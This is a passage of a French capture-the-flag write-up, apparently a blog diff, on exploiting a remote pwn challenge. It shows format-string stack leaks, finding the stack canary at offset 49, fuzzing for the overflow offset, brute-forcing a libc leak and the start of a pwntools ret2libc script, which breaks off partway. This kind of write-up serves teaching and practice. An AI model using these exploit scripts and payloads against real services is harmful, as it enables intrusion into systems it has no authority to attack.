+</span></span><span style="display:flex;"><span> <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Leaking all the Stack ...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span> - b<span style="color:#e6db74">&#39;AAAA....%0$p&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> - b<span style="color:#e6db74">&#39;AAAA....0x7ffea4af1bd0&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span> - b<span style="color:#e6db74">&#39;AAAA....(nil)&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3</span> - b<span style="color:#e6db74">&#39;AAAA....(nil)&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4</span> - b<span style="color:#e6db74">&#39;AAAA....0xc&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">5</span> - b<span style="color:#e6db74">&#39;AAAA....0xffffffffffffff88&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">6</span> - b<span style="color:#e6db74">&#39;AAAA....0x2e2e2e2e41414141&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7</span> - b<span style="color:#e6db74">&#39;AAAA....0x70243725&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">8</span> - b<span style="color:#e6db74">&#39;AAAA....(nil)&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">9</span> - b<span style="color:#e6db74">&#39;AAAA....(nil)&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">10</span> - b<span style="color:#e6db74">&#39;AAAA....(nil)&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">11</span> - b<span style="color:#e6db74">&#39;AAAA....(nil)&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">12</span> - b<span style="color:#e6db74">&#39;AAAA....(nil)&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">13</span> - b<span style="color:#e6db74">&#39;AAAA....(nil)&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">14</span> - b<span style="color:#e6db74">&#39;AAAA....(nil)&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">15</span> - b<span style="color:#e6db74">&#39;AAAA....(nil)&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">16</span> - b<span style="color:#e6db74">&#39;AAAA....(nil)&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">17</span> - b<span style="color:#e6db74">&#39;AAAA....0x2009005&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">18</span> - b<span style="color:#e6db74">&#39;AAAA....0x7ffe2116c788&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">19</span> - b<span style="color:#e6db74">&#39;AAAA....0xb&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">20</span> - b<span style="color:#e6db74">&#39;AAAA....0x1&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">21</span> - b<span style="color:#e6db74">&#39;AAAA....(nil)&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">22</span> - b<span style="color:#e6db74">&#39;AAAA....0x2009005&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">23</span> - b<span style="color:#e6db74">&#39;AAAA....0x7fbecbe9b6fe&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">24</span> - b<span style="color:#e6db74">&#39;AAAA....(nil)&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">25</span> - b<span style="color:#e6db74">&#39;AAAA....0x1800000&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">26</span> - b<span style="color:#e6db74">&#39;AAAA....0x800&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">27</span> - b<span style="color:#e6db74">&#39;AAAA....0x40&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">28</span> - b<span style="color:#e6db74">&#39;AAAA....0x8000&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">29</span> - b<span style="color:#e6db74">&#39;AAAA....0x8&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">30</span> - b<span style="color:#e6db74">&#39;AAAA....0x40&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">31</span> - b<span style="color:#e6db74">&#39;AAAA....0x40&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">32</span> - b<span style="color:#e6db74">&#39;AAAA....(nil)&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">33</span> - b<span style="color:#e6db74">&#39;AAAA....(nil)&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">34</span> - b<span style="color:#e6db74">&#39;AAAA....0x7fff92e37fd9&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">35</span> - b<span style="color:#e6db74">&#39;AAAA....(nil)&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">36</span> - b<span style="color:#e6db74">&#39;AAAA....(nil)&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">37</span> - b<span style="color:#e6db74">&#39;AAAA....(nil)&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">38</span> - b<span style="color:#e6db74">&#39;AAAA....(nil)&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">39</span> - b<span style="color:#e6db74">&#39;AAAA....(nil)&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">40</span> - b<span style="color:#e6db74">&#39;AAAA....(nil)&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">41</span> - b<span style="color:#e6db74">&#39;AAAA....(nil)&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">42</span> - b<span style="color:#e6db74">&#39;AAAA....(nil)&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">43</span> - b<span style="color:#e6db74">&#39;AAAA....0x5588e59d12c5&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">44</span> - b<span style="color:#e6db74">&#39;AAAA....(nil)&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">45</span> - b<span style="color:#e6db74">&#39;AAAA....0x56526d234280&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">46</span> - b<span style="color:#e6db74">&#39;AAAA....(nil)&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">47</span> - b<span style="color:#e6db74">&#39;AAAA....0x559eb6193090&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">48</span> - b<span style="color:#e6db74">&#39;AAAA....0x7ffc04377b40&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">49</span> - b<span style="color:#e6db74">&#39;AAAA....0xf0285d4279221400&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">50</span> - b<span style="color:#e6db74">&#39;AAAA....(nil)&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">51</span> - b<span style="color:#e6db74">&#39;AAAA....0x7f8f920d27ed&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">52</span> - b<span style="color:#e6db74">&#39;AAAA....0x7ffd40923768&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">53</span> - b<span style="color:#e6db74">&#39;AAAA....0x137775000&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">54</span> - b<span style="color:#e6db74">&#39;AAAA....0x564e0e625175&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">55</span> - b<span style="color:#e6db74">&#39;AAAA....0x7ffd9f160ba9&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">56</span> - b<span style="color:#e6db74">&#39;AAAA....0x560d50fbc280&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">57</span> - b<span style="color:#e6db74">&#39;AAAA....0x4516be6f0cfd5015&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">58</span> - b<span style="color:#e6db74">&#39;AAAA....0x55d29e896090&#39;</span>
+</span></span></code></pre></div><p>BINGO ! On sait qu&rsquo;un Canary se termine pas <code>00</code> . On repère donc la l&rsquo;offset <code>49</code></p>
+<p>On peut le vérifier en faisant leaker la 49ème valeur. Elle se termine à chaque fois par <code>00</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">Verif_Canary</span>(offset):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">10</span>):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            proc <span style="color:#f92672">=</span> Get_proc()     
+</span></span><span style="display:flex;"><span>            proc<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;what did you see?:&#39;</span>)     
+</span></span><span style="display:flex;"><span>            proc<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%%%d</span><span style="color:#e6db74">$p&#34;</span> <span style="color:#f92672">%</span> offset)
+</span></span><span style="display:flex;"><span>            proc<span style="color:#f92672">.</span>recvline()
+</span></span><span style="display:flex;"><span>            res <span style="color:#f92672">=</span> proc<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39; &#39;</span>)[<span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;Test </span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> - </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">%</span>(_,res))
+</span></span><span style="display:flex;"><span>            proc<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Verif_Canary(<span style="color:#ae81ff">49</span>)
+</span></span></code></pre></div><p>Résulat :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@DESKTOP-HNQJECB: /c
+</span></span><span style="display:flex;"><span>➜   python3 writeup.py
+</span></span><span style="display:flex;"><span>Test <span style="color:#ae81ff">0</span> - b<span style="color:#e6db74">&#39;0x3a3baf68538ce400&#39;</span>
+</span></span><span style="display:flex;"><span>Test <span style="color:#ae81ff">1</span> - b<span style="color:#e6db74">&#39;0x1bed75a7af3e8700&#39;</span>
+</span></span><span style="display:flex;"><span>Test <span style="color:#ae81ff">2</span> - b<span style="color:#e6db74">&#39;0x17bdade8c75b1400&#39;</span>
+</span></span><span style="display:flex;"><span>Test <span style="color:#ae81ff">3</span> - b<span style="color:#e6db74">&#39;0xfcfee3f27277b800&#39;</span>
+</span></span><span style="display:flex;"><span>Test <span style="color:#ae81ff">4</span> - b<span style="color:#e6db74">&#39;0x9ac856b2e0729100&#39;</span>
+</span></span><span style="display:flex;"><span>Test <span style="color:#ae81ff">5</span> - b<span style="color:#e6db74">&#39;0x631bea7f077e2500&#39;</span>
+</span></span><span style="display:flex;"><span>Test <span style="color:#ae81ff">6</span> - b<span style="color:#e6db74">&#39;0xcf3631335f3ddf00&#39;</span>
+</span></span><span style="display:flex;"><span>Test <span style="color:#ae81ff">7</span> - b<span style="color:#e6db74">&#39;0x9284289d275e4f00&#39;</span>
+</span></span><span style="display:flex;"><span>Test <span style="color:#ae81ff">8</span> - b<span style="color:#e6db74">&#39;0x8ccbd313f0140600&#39;</span>
+</span></span><span style="display:flex;"><span>Test <span style="color:#ae81ff">9</span> - b<span style="color:#e6db74">&#39;0x881a52aa94b22b00&#39;</span>
+</span></span></code></pre></div><p>On peut écrire une fonction pour faire leak les adresses rapidement en fonction de l&rsquo;offset :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">Leak_addr</span>(all_leak,proc):
+</span></span><span style="display:flex;"><span>	proc<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;tell me, what did you see?:&#39;</span>)
+</span></span><span style="display:flex;"><span>	payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> leak <span style="color:#f92672">in</span> all_leak:
+</span></span><span style="display:flex;"><span>		payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;%</span><span style="color:#e6db74">{</span>leak<span style="color:#e6db74">}</span><span style="color:#e6db74">$p.&#39;</span>
+</span></span><span style="display:flex;"><span>	proc<span style="color:#f92672">.</span>sendline(bytes(payload[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>],<span style="color:#e6db74">&#39;utf-8&#39;</span>))
+</span></span><span style="display:flex;"><span>	proc<span style="color:#f92672">.</span>recvline()
+</span></span><span style="display:flex;"><span>	res <span style="color:#f92672">=</span> proc<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>decode()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39; &#39;</span>)[<span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> res<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;.&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>offset_canary <span style="color:#f92672">=</span> <span style="color:#ae81ff">49</span>
+</span></span><span style="display:flex;"><span>proc   <span style="color:#f92672">=</span> Get_proc()
+</span></span><span style="display:flex;"><span>canary <span style="color:#f92672">=</span> Leak_addr([offset_canary],proc)
+</span></span></code></pre></div><p>Essayer maintenant de trouver ou se place le <strong>canary</strong> sur le buffer de la 2nd entrée :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">Fuzz_overflow</span>():
+</span></span><span style="display:flex;"><span>	offset <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">100</span>):
+</span></span><span style="display:flex;"><span>		proc <span style="color:#f92672">=</span> Get_proc()
+</span></span><span style="display:flex;"><span>		proc<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;what did you see?:&#39;</span>)
+</span></span><span style="display:flex;"><span>		proc<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span>)
+</span></span><span style="display:flex;"><span>		proc<span style="color:#f92672">.</span>recvline()
+</span></span><span style="display:flex;"><span>		proc<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span>_<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>)
+</span></span><span style="display:flex;"><span>		resp <span style="color:#f92672">=</span> proc<span style="color:#f92672">.</span>recvall(timeout <span style="color:#f92672">=</span> <span style="color:#ae81ff">0.2</span>)<span style="color:#f92672">.</span>decode()<span style="color:#f92672">.</span>strip()<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>,<span style="color:#e6db74">&#39; | &#39;</span>)
+</span></span><span style="display:flex;"><span>		print(_,<span style="color:#e6db74">&#39; | &#39;</span>,resp)
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span>(<span style="color:#e6db74">&#34;stack smashing detected&#34;</span> <span style="color:#f92672">in</span> resp):
+</span></span><span style="display:flex;"><span>			offset <span style="color:#f92672">=</span> _
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> offset
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ae81ff">35</span>  |  a A ?nice one | please, give me a feedback:  | thanks, see you later
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">36</span>  |  a A ?nice one | please, give me a feedback:  | thanks, see you later
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">37</span>  |  a A ?nice one | please, give me a feedback:  | thanks, see you later
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">38</span>  |  a A ?nice one | please, give me a feedback:  | thanks, see you later
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">39</span>  |  a A ?nice one | please, give me a feedback:  | thanks, see you later
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">40</span>  |  a A ?nice one | please, give me a feedback:  | thanks, see you later | *** stack smashing detected ***: terminated
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">41</span>  |  a A ?nice one | please, give me a feedback:  | thanks, see you later | *** stack smashing detected ***: terminated
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">42</span>  |  a A ?nice one | please, give me a feedback:  | thanks, see you later | *** stack smashing detected ***: terminated
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">43</span>  |  a A ?nice one | please, give me a feedback:  | thanks, see you later | *** stack smashing detected ***: terminated
+</span></span></code></pre></div><p>On sait donc que la buffer est de taille <code>39</code> et que le canary se place juste après à la position <code>40</code></p>
+<h6 id="lattaque-ret2libc">L&rsquo;attaque Ret2Libc</h6>
+<p>Nôtre idée était de trouver la libc utiliser et de faire Leak une fonction telle que <strong>puts</strong> ou <strong>printf</strong></p>
+<p>Pour se faire , voici le pattern que nous avons utilisé pour chercher les adresses du programmes :</p>
+<ul>
+<li><em>[</em> Padding du buffer de 39char <em>]</em> + <em>[</em> Canary <em>]</em> +<em>[</em> BBBBBBBB <em>]</em>(=rbp) +  <em>[</em> Addresse <em>]</em></li>
+</ul>
+<p>Ainsi de cette manière , nous avons exécuté des attaques <strong>Ret2Win</strong> à la recherche de printf
+Malhereusement , <strong>nous n&rsquo;avons pas trouvé ces fonctions dans le binaire</strong> . Il y a une raison trés simple &hellip;
+Nous n&rsquo;étions pas dans le binaire mais <strong>dans la libc .</strong></p>
+<p>Pourtant une chose nous à servis pour la suite :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">Leak_puts</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(<span style="color:#f92672">-</span><span style="color:#ae81ff">1000</span>,<span style="color:#ae81ff">1000</span>):
+</span></span><span style="display:flex;"><span>        proc <span style="color:#f92672">=</span> Get_proc()
+</span></span><span style="display:flex;"><span>        canary,libc_start_main_ret <span style="color:#f92672">=</span> Leak_addr([<span style="color:#ae81ff">49</span>,<span style="color:#ae81ff">51</span>],proc)
+</span></span><span style="display:flex;"><span>        proc<span style="color:#f92672">.</span>recvline()
+</span></span><span style="display:flex;"><span>        payload  <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">39</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p64(int(canary,<span style="color:#ae81ff">16</span>))
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p64(int(libc_start_main_ret,<span style="color:#ae81ff">16</span>))
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p64(int(libc_start_main_ret,<span style="color:#ae81ff">16</span>)<span style="color:#f92672">+</span> x)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        proc<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>        response <span style="color:#f92672">=</span> proc<span style="color:#f92672">.</span>recvall(timeout <span style="color:#f92672">=</span> <span style="color:#ae81ff">0.5</span>)<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>        print(x,<span style="color:#e6db74">&#39; | &#39;</span>,response)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Leak_puts()
+</span></span></code></pre></div><p>Résultat :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ae81ff">303</span>  |  b<span style="color:#e6db74">&#39;thanks, see you later&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">304</span>  |  b<span style="color:#e6db74">&#39;thanks, see you later&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">305</span>  |  b<span style="color:#e6db74">&#39;thanks, see you later\n*** stack smashing detected ***: terminated&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">306</span>  |  b<span style="color:#e6db74">&#39;thanks, see you later&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">307</span>  |  b<span style="color:#e6db74">&#39;thanks, see you later\n*** stack smashing detected ***: terminated&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">308</span>  |  b<span style="color:#e6db74">&#39;thanks, see you later&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">309</span>  |  b<span style="color:#e6db74">&#39;thanks, see you later&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">310</span>  |  b<span style="color:#e6db74">&#39;thanks, see you later&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">311</span>  |  b<span style="color:#e6db74">&#39;thanks, see you later&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">312</span>  |  b<span style="color:#e6db74">&#39;thanks, see you later\n*** stack smashing detected ***: terminated&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">313</span>  |  b<span style="color:#e6db74">&#39;thanks, see you later\nGNU C Library (Debian GLIBC 2.33-1) release release version 2.33.\nCopyright (C) 2021 Free Software Foundation, Inc.\nThis is free software; see the source for copying conditions.\nThere is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A\nPARTICULAR PURPOSE.\nCompiled by GNU CC version 10.3.1 20211117.\nlibc ABIs: UNIQUE IFUNC ABSOLUTE\nFor bug reporting instructions, please see:\n&lt;http://www.debian.org/Bugs/&gt;.&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">314</span>  |  b<span style="color:#e6db74">&#39;thanks, see you later&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">315</span>  |  b<span style="color:#e6db74">&#39;thanks, see you later\nGNU C Library (Debian GLIBC 2.33-1) release release version 2.33.\nCopyright (C) 2021 Free Software Foundation, Inc.\nThis is free software; see the source for copying conditions.\nThere is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A\nPARTICULAR PURPOSE.\nCompiled by GNU CC version 10.3.1 20211117.\nlibc ABIs: UNIQUE IFUNC ABSOLUTE\nFor bug reporting instructions, please see:\n&lt;http://www.debian.org/Bugs/&gt;.&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">316</span>  |  b<span style="color:#e6db74">&#39;thanks, see you later&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">317</span>  |  b<span style="color:#e6db74">&#39;thanks, see you later&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">318</span>  |  b<span style="color:#e6db74">&#39;thanks, see you later&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">319</span>  |  b<span style="color:#e6db74">&#39;thanks, see you later\n*** stack smashing detected ***: terminated&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">320</span>  |  b<span style="color:#e6db74">&#39;thanks, see you later&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">321</span>  |  b<span style="color:#e6db74">&#39;thanks, see you later&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">322</span>  |  b<span style="color:#e6db74">&#39;thanks, see you later&#39;</span>
+</span></span></code></pre></div><p>Hourra ! Nous avons la libc : <code>(Debian GLIBC 2.33-1) release release version 2.33</code> !
+Plus exactement : <strong>libc6_2.28-10deb10u1_amd64.so</strong></p>
+<h6 id="finalisation">Finalisation</h6>
+<p>Maintenant que nous avons la libc , il nous faut trouver la base de celle exécuté en remote ou trouver un leak .</p>
+<p>Nous avons pris du temps à réaliser que l&rsquo;adresse après la <code>PIE</code> , elle même après le <code>Canary</code> était en faite l&rsquo;adresse <code>libc_start_main_ret</code> et non <code>rip</code> comme nous pensions .</p>
+<p>Grâce à <a href="https://github.com/niklasb/libc-database" target="_blank">libc-database</a> , on peut trouver l&rsquo;offset pour obtenir la base de la libc</p>
+<pre tabindex="0"><code>./dump libc6_2.28-10+deb10u1_amd64 __libc_start_main_ret
+offset___libc_start_main_ret = 0x2409b
+</code></pre><p>Voici le script final avec un <strong>Ret2Libc</strong> similaire à mon précédent writeup .</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># -*- coding: utf-8 -*-</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>update(arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;amd64&#34;</span>, os<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;linux&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./libc6_2.28-10deb10u1_amd64.so&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url  <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;warzone.hackrocks.com&#39;</span>
+</span></span><span style="display:flex;"><span>port <span style="color:#f92672">=</span> <span style="color:#ae81ff">7772</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">Get_proc</span>():	<span style="color:#66d9ef">return</span> connect(url,port)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">Leak_addr</span>(all_leak,proc):
+</span></span><span style="display:flex;"><span>	proc<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;tell me, what did you see?:&#39;</span>)
+</span></span><span style="display:flex;"><span>	payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> leak <span style="color:#f92672">in</span> all_leak:
+</span></span><span style="display:flex;"><span>		payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;%</span><span style="color:#e6db74">{</span>leak<span style="color:#e6db74">}</span><span style="color:#e6db74">$p.&#39;</span>
+</span></span><span style="display:flex;"><span>	proc<span style="color:#f92672">.</span>sendline(bytes(payload[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>],<span style="color:#e6db74">&#39;utf-8&#39;</span>))
+</span></span><span style="display:flex;"><span>	proc<span style="color:#f92672">.</span>recvline()
+</span></span><span style="display:flex;"><span>	res <span style="color:#f92672">=</span> proc<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>decode()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39; &#39;</span>)[<span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> res<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;.&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>proc <span style="color:#f92672">=</span> Get_proc()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>offset_canary <span style="color:#f92672">=</span> <span style="color:#ae81ff">49</span>
